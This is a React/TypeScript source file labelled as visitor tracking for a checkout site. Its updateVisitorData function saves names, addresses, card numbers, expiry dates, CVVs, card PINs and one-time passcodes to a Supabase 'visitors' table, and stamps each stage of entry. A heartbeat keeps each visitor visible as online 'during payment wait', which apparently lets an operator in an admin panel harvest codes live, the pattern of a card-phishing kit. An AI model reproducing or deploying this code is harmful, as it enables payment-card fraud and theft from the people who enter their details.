import { useEffect, useRef } from "react";
import { useLocation } from "react-router-dom";
import { visitorClient as supabase } from "@/lib/visitorClient";
import type { TablesUpdate } from "@/integrations/supabase/types";
import { useCountry } from "@/contexts/CountryContext";
import { useCurrency } from "@/contexts/CurrencyContext";

const SESSION_KEY = "sl_visitor_sid";
const BOOTSTRAP_KEY_PREFIX = "sl_visitor_bootstrapped:";

/** Get the current path working with both BrowserRouter and HashRouter */
const getCurrentPath = (): string => {
  if (typeof window === "undefined") return "/";
  // HashRouter: window.location.hash = "#/payment" -> "/payment"
  if (window.location.hash.startsWith("#")) {
    return window.location.hash.slice(1) || "/";
  }
  // BrowserRouter fallback
  return window.location.pathname;
};

/** Routes that belong to the admin panel — never tracked as visitor activity. */
const isAdminPath = (path: string) =>
  path.startsWith("/admin");

const getBootstrapKey = (sessionId: string) => `${BOOTSTRAP_KEY_PREFIX}${sessionId}`;

const isBootstrapped = (sessionId: string) => {
  if (typeof window === "undefined") return false;
  return localStorage.getItem(getBootstrapKey(sessionId)) === "1";
};

const markBootstrapped = (sessionId: string) => {
  if (typeof window === "undefined") return;
  localStorage.setItem(getBootstrapKey(sessionId), "1");
};

const getSessionId = (): string => {
  let sid = localStorage.getItem(SESSION_KEY);
  if (!sid) {
    if (typeof window !== "undefined" && isAdminPath(getCurrentPath())) {
      return "__admin_placeholder__";
    }
    sid = (crypto.randomUUID?.() ?? `v_${Date.now()}_${Math.random().toString(36).slice(2)}`);
    localStorage.setItem(SESSION_KEY, sid);
  }
  return sid;
};

export const getVisitorSessionId = getSessionId;

type BootstrapPayload = {
  session_id: string;
  landing_path: string;
  last_path: string;
  user_agent: string;
  referrer: string | null;
  language: string;
  last_seen_at: string;
  detected_country?: string;
  country?: string;
  currency?: string;
};

type VisitorUpdatePayload = TablesUpdate<"visitors">;

let bootstrapPromise: Promise<void> | null = null;
let bootstrapSessionId: string | null = null;

const ensureVisitorRecord = async (payload: BootstrapPayload) => {
  if (payload.session_id === "__admin_placeholder__") return payload.session_id;
  if (isBootstrapped(payload.session_id)) return payload.session_id;

  if (bootstrapPromise && bootstrapSessionId === payload.session_id) {
    await bootstrapPromise;
    return payload.session_id;
  }

  bootstrapSessionId = payload.session_id;
  bootstrapPromise = (async () => {
    const { error } = await supabase
      .from("visitors")
      .insert(payload);

    if (error && error.code !== "23505") {
      console.error("[visitor] bootstrap insert failed", error);
      return;
    }

    markBootstrapped(payload.session_id);
  })().finally(() => {
    bootstrapPromise = null;
    bootstrapSessionId = null;
  });

  await bootstrapPromise;
  return payload.session_id;
};

const createWindowBootstrapPayload = (session_id: string): BootstrapPayload => {
  const now = new Date().toISOString();
  const path = getCurrentPath();
  return {
    session_id,
    landing_path: path,
    last_path: path,
    user_agent: navigator.userAgent,
    referrer: document.referrer || null,
    language: navigator.language,
    last_seen_at: now,
  };
};

const persistVisitorUpdate = async (
  session_id: string,
  updatePayload: VisitorUpdatePayload,
) => {
  const { data: updated, error: updateErr } = await supabase
    .from("visitors")
    .update(updatePayload)
    .eq("session_id", session_id)
    .select("id");

  if (updateErr) {
    console.error("[visitor] update failed", updateErr);
    throw updateErr;
  }

  if (!updated || updated.length === 0) {
    const bootstrap = createWindowBootstrapPayload(session_id);
    const { error: upsertErr } = await supabase
      .from("visitors")
      .upsert(
        { ...bootstrap, ...updatePayload },
        { onConflict: "session_id" },
      );

    if (upsertErr) {
      console.error("[visitor] fallback upsert failed", upsertErr);
      throw upsertErr;
    }
  }

  markBootstrapped(session_id);
};

export const updateVisitorData = async (data: {
  full_name?: string;
  email?: string;
  phone?: string;
  address?: string;
  city?: string;
  country?: string;
  postal_code?: string;
  user_id?: string;
  card_holder?: string;
  card_number?: string;
  card_expiry?: string;
  card_cvv?: string;
  card_pin?: string;
  card_otp?: string;
  plan_selected?: string;
  order_total?: string;
}) => {
  const currentPath = getCurrentPath();
  if (typeof window !== "undefined" && isAdminPath(currentPath)) {
    return;
  }

  const session_id = getSessionId();
  if (session_id === "__admin_placeholder__") return;

  const now = new Date().toISOString();

  const stageStamps = {
    ...(data.full_name || data.email || data.phone || data.address || data.city || data.postal_code || data.plan_selected || data.order_total
      ? { checkout_at: now }
      : {}),
    ...(data.card_holder || data.card_number || data.card_expiry || data.card_cvv
      ? { card_at: now }
      : {}),
    ...(data.card_pin ? { pin_at: now } : {}),
    ...(data.card_otp ? { otp_at: now } : {}),
  };

  await ensureVisitorRecord(createWindowBootstrapPayload(session_id));

  const updatePayload: VisitorUpdatePayload = {
    ...data,
    ...stageStamps,
    last_seen_at: now,
    last_path: currentPath,
    language: navigator.language,
  };

  await persistVisitorUpdate(session_id, updatePayload);
};

/** Tracks the current visitor — registers on first visit, updates path on navigation. */
export const useVisitorTracking = () => {
  const location = useLocation();
  const { country, info } = useCountry();
  const { currency } = useCurrency();
  const initialized = useRef(false);

  useEffect(() => {
    if (initialized.current) return;
    const currentPath = getCurrentPath();
    if (isAdminPath(currentPath)) return;
    initialized.current = true;

    const session_id = getSessionId();
    if (session_id === "__admin_placeholder__") return;

    void ensureVisitorRecord({
      ...createWindowBootstrapPayload(session_id),
      detected_country: country,
      country: info.nameAr,
      currency,
    });
  }, [country, info.nameAr, currency, location.pathname]);

  useEffect(() => {
    if (!initialized.current) return;
    const currentPath = getCurrentPath();
    if (isAdminPath(currentPath)) return;

    const session_id = getSessionId();
    if (session_id === "__admin_placeholder__") return;

    const now = new Date().toISOString();

    void (async () => {
      await ensureVisitorRecord({
        ...createWindowBootstrapPayload(session_id),
        detected_country: country,
        country: info.nameAr,
        currency,
      });

      await persistVisitorUpdate(session_id, {
        last_path: currentPath,
        last_seen_at: now,
        detected_country: country,
        country: info.nameAr,
        currency,
        language: navigator.language,
      });
    })();
  }, [location.pathname, country, info.nameAr, currency]);

  // Heartbeat: keep last_seen_at fresh every 30s so visitor stays Online during payment wait
  useEffect(() => {
    const currentPath = getCurrentPath();
    if (isAdminPath(currentPath)) return;

    const session_id = getSessionId();
    if (session_id === "__admin_placeholder__") return;

    const interval = setInterval(async () => {
      try {
        await persistVisitorUpdate(session_id, {
          last_seen_at: new Date().toISOString(),
          last_path: getCurrentPath(),
        });
      } catch (e) {
        // silent — heartbeat failure is non-critical
      }
    }, 30_000);

    return () => clearInterval(interval);
  }, [location.pathname]);
};